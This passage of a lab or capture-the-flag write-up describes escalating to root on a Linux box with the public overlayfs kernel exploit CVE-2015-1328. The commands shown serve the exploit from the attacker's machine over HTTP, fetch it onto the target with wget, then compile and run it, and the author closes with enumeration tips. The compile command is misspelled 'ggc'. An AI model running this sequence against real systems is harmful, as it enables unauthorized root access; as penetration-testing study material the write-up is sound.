Privesc:

I had a good feeling with this box. So I checked sudo and then checked the kernel version:

OffSec's Exploit Database Archive
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation. CVE-2015-1328 …www.exploit-db.com

This was the most common exploit for that version. I went, maybe dirty cow, but this was the better option.

on my machine:

searchsploit -m 37292
python3 -m http.server 80

Then once shared:

wget http://192.168.49.59/37292.c
ggc 37292.c -o exploit
ls (check to see you need to use chmod)
./exploit

The rest was history. I like this box for building OSINT and for very common tactics. Before everyone runs LinPEAS, check kernel versions, SUIDs, Sudo -l, cron -l. Start with the small stuff until you know it won't work. That’s my advice for Linux PrivEsc.
